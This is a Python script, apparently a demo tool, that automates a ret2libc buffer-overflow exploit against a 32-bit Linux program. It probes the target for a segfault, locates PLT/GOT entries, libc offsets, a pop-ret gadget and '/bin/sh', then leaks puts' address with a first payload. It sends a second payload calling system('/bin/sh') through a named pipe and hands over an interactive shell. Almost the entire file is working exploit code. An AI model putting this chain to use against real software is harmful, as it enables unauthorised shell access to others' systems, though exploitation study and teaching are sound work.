import os
from os import path
import click
from find_segfault import find_segfault
from bin_handler import Bin_handler
from evil_payload_handler import Evil_payload_handler
from string_handler import search_string_in_file
from gadget_finder import Gadget_finder
from process_handler import Process_handler


def click_confirm(message=""):
    click.confirm("\n[DEMO] " + message, default="y")
    print("")


def has_null_bytes(hexstr):
    if "00" in hexstr:
        return True
    return False


def cleanup(payload_name):
    try:
        if len(payload_name) > 0:
            os.unlink(payload_name)
    except OSError:
        print("Unable to delete payload file", payload_name)


def validate_program():
    program_name = ""
    program_name = click.prompt('Please enter a program name', type=str)
    print("")
    print("Program name is", program_name)

    if path.exists(program_name) is False:
        print("Program does not exists, exiting...")
        exit()

    return program_name


def validate_probe_mode():
    probe_mode = 0
    print("")
    print("Please select method of probing for buffer overflow:")
    print("1 - probe with payload as argument")
    print("2 - probe with payload as filename")
    print("3 - probe with payload as argument and filename")
    print("4 - automate probing (default)")
    valid_probing_mode = False
    while valid_probing_mode is False:
        probe_mode = click.prompt('Method:', type=int, default=4)
        print("")
        if probe_mode in [1, 2, 3, 4]:
            valid_probing_mode = True
        else:
            print('Invalid method, try again')
    return probe_mode


def validate_max_payload_size():
    max_payload_size = 0
    valid_payload_size = False
    while valid_payload_size is False:
        max_payload_size = click.prompt('Please enter maximum payload size',
                                        type=int,
                                        default=600)
        print("")
        if max_payload_size > 0:
            valid_payload_size = True

    print("Payload size is", max_payload_size)
    return max_payload_size


# main start of the script
program_name = validate_program()

probe_mode = validate_probe_mode()

# NOTE: we are not able to automate max payload size value calculation
max_payload_size = validate_max_payload_size()

# if mode 1 and 3 are selected DO NOTHING

# get filename if 2 and 3 are selected
payload_name = ''
if probe_mode == 2 or probe_mode == 3:
    payload_name = click.prompt('Please enter name of payload file',
                                type=str)

# TODO: determine architect type of binary
bin_arch = 32

click_confirm('Press any key to check for segfault')

seg_fault_results = find_segfault(program_name,
                                  bin_arch,
                                  probe_mode,
                                  max_payload_size,
                                  payload_name)

has_segfault, segfault_address, segfault_offset, \
    found_payload_file, found_str_address = seg_fault_results

if len(found_payload_file) > 0:
    payload_name = found_payload_file

if has_segfault:
    print("Segfault found at", segfault_address)
    print("Segfault offset is", segfault_offset)
else:
    print("No segfault found")
    exit()

click_confirm("Press any key to continue check for libc")

print("")
print("Checking if libc is used")
print("---------------------------------------------")

# check for libc
bh = Bin_handler(program_name)
if bh.has_libc() is True:
    print("Found libc at", bh.libc_path)
else:
    print("Libc not found")
    exit()

click_confirm('Press any key to continue check static addresses')

print("")
print("Searching for static addresses")
print("---------------------------------------------")

# To check for plt sections, we want printf or puts
# that will be used for leaking the libc address

# For GOT address, we are interested in .got.plt section
# of "readelf -S binary_file"
found_printf, printf_plt, printf_got = bh.search_plt_got(program_name,
                                                         'printf')
# TODO: temporarily not using printf
found_printf = False

found_puts, puts_plt, puts_got = bh.search_plt_got(program_name,
                                                   'puts')

if found_printf:
    print("Found address of printf@plt", printf_plt)
    print("Found address of printf@got", printf_got)

if found_puts:
    print("Found address of puts@plt", puts_plt)
    print("Found address of puts@got", puts_got)

# check for address of important functions
system_found, system_offset = bh.search_function(bh.libc_path, 'system')
printf_found, printf_offset = bh.search_function(bh.libc_path, 'printf')
puts_found, puts_offset = bh.search_function(bh.libc_path, 'puts')
exit_found, exit_offset = bh.search_function(bh.libc_path, 'exit')
sstart_found, sstart_address = bh.search_asm_function(program_name, '_start')

print("Found address of _start", sstart_address)

if has_null_bytes(sstart_address):
    print("WARNING, address contains NULL bytes, will make a minor change")
    sstart_address_int = int(sstart_address, 16)
    sstart_address_int = sstart_address_int + 4
    sstart_address = hex(sstart_address_int)[2:]
    print("Found address of _start[UPDATED]", sstart_address)

click_confirm('Press any key to continue to check address offsets')

print("")
print("Searching for address offsets")
print("---------------------------------------------")

print("Offset of system", system_offset)
print("Offset of printf", printf_offset)
print("Offset of puts", puts_offset)
print("offset of exit", exit_offset)

click_confirm('Press any key to continue searching for gadget')

print("")
print("Searching for gadget address (pop e?x; ret;)")
print("---------------------------------------------")

# find any gadget pop register; ret;
ax_sections = bh.get_ax_sections(program_name)
gfinder = Gadget_finder(program_name)
found_gadget = False
gadget_address = ''
popregret_address = ''
for xsection in ax_sections:
    print("Checking executable section", xsection)

    ax_add_int = int(ax_sections[xsection][0], 16)
    ax_start_int = int(ax_sections[xsection][1], 16)
    ax_end_int = ax_start_int + int(ax_sections[xsection][2], 16)

    gadget_regex = r"0x([a-f0-9]+):\spop\se\w?x;\s?(0x[a-f0-9]+):\s?ret\s?;"
    found_gadget, gadget_address = gfinder.find(gadget_regex,
                                                ax_start_int,
                                                ax_end_int)
    if found_gadget:
        popregret_address = ax_add_int + int(gadget_address, 16)
        print("Found gadget in",
              xsection,
              "section with address",
              hex(popregret_address))
        break

click_confirm('Press any key to continue find /bin/sh address offset')

print("")
print("Searching for /bin/sh address offset")
print("---------------------------------------------")

# find bin/sh string address from libc's rodata
b_sec_results = bh.search_binary_section(bh.libc_path, '.rodata')
found_rodata, rodata_address, rodata_start, rodata_end = b_sec_results
rodata_address_int = int(rodata_address, 16)
rodata_start_int = int(rodata_start, 16)
rodata_end_int = rodata_start_int + int(rodata_end, 16)

binsh_offset_int = search_string_in_file(bh.libc_path,
                                         "/bin/sh",
                                         rodata_start_int,
                                         rodata_end_int)

binsh_offset_hex = hex(rodata_address_int + binsh_offset_int)

print("Offset of /bin/sh", binsh_offset_hex)

evil = Evil_payload_handler(max_payload_size, segfault_offset)
if found_printf:
    evil.add_content(int(printf_plt, 16))
else:
    evil.add_content(int(puts_plt, 16))

# random address for testing purpose
if found_str_address > 0:

    # make payload first print random string, then print got address
    # gadget to pop
    evil.add_content(popregret_address)
    evil.add_content(found_str_address)

    if found_printf:
        evil.add_content(int(printf_plt, 16))
    else:
        evil.add_content(int(puts_plt, 16))

    evil.add_content(popregret_address)
    if found_printf:
        evil.add_content(int(printf_got, 16))
    else:
        evil.add_content(int(puts_got, 16))

    # put address to start of the program
    evil.add_content(int(sstart_address, 16))
    evil.add_content(found_str_address)
    evil.add_content(found_str_address)
    evil.add_content(found_str_address)

else:
    # TODO: need to find a string that has a valid address
    print("this part of logic is incomplete")

# use fifo pipe instead
evil.write_to_plaintext("debug_" + program_name + "_payload_1")

try:
    os.unlink(payload_name)
except OSError:
    pass
os.mkfifo(payload_name)

click_confirm('Press any key to begin exploit')

print("")
print("Starting exploit")
print("---------------------------------------------")

proc = Process_handler(program_name)
# use payload_name as argument
proc.process(payload_name)

phandle = open(f"./{payload_name}", 'wb', 0)
phandle.write(evil.get_payload())
print("First payload is written")

tempstr = payload_name + "\n"
print("Reading until following bytes:", tempstr.encode('utf-8'))
recv_str = proc.recvuntil(delims=tempstr.encode('utf-8'), timeout=10)
print("Receive from program with first payload: {}".format(recv_str))

if len(recv_str) == 0:
    print("exploit failed")
    cleanup(payload_name)
    exit()

recvdata = proc.recvline()

if found_printf:
    print("Full leak", recvdata)
    print("len of string used", len(payload_name))
    len_to_ignore = 0
    # TODO: need additional if for 64 bit
    len_to_ignore_end = 4+len_to_ignore
    recvdata = recvdata[len_to_ignore:len_to_ignore_end]
else:
    print("Full leak", recvdata)
    len_to_ignore = 0
    # TODO: need additional if for 64 bit
    len_to_ignore_end = 4+len_to_ignore
    recvdata = recvdata[len_to_ignore:len_to_ignore_end]
    recvdata = recvdata[:4]

leaked_bytes = bytearray.fromhex(recvdata.hex())
if found_printf:
    print("Leaked address of printf:",
          hex(int.from_bytes(leaked_bytes, byteorder='little')))
else:
    print("Leaked address of puts:",
          hex(int.from_bytes(leaked_bytes, byteorder='little')))

click_confirm('Press any key to calculate libc address')

# calculate all addresses
libc_base_address = 0
if found_printf:
    libc_base_address = int.from_bytes(leaked_bytes, byteorder='little') - \
                        int(printf_offset, 16)
else:
    libc_base_address = int.from_bytes(leaked_bytes, byteorder='little') - \
                        int(puts_offset, 16)

print("Calculated libc address:", hex(libc_base_address))

system_address = libc_base_address + int(system_offset, 16)
binsh_address = libc_base_address + int(binsh_offset_hex, 16)
exit_address = libc_base_address + int(exit_offset, 16)

print("Function system address:", hex(system_address))
print("String /bin/sh address:", hex(binsh_address))
print("Function exit address:", hex(exit_address))

second_evil = Evil_payload_handler(max_payload_size, segfault_offset)
second_evil.add_content(system_address)
second_evil.add_content(exit_address)
second_evil.add_content(binsh_address)

print("Second Payload written to pipe")

phandle.write(second_evil.get_payload())
second_evil.write_to_plaintext("debug_" + program_name + "_payload_2")

# ready to get interactive after sending
click_confirm('Press any key to get interactive shell')

proc.interactive()

cleanup(payload_name)
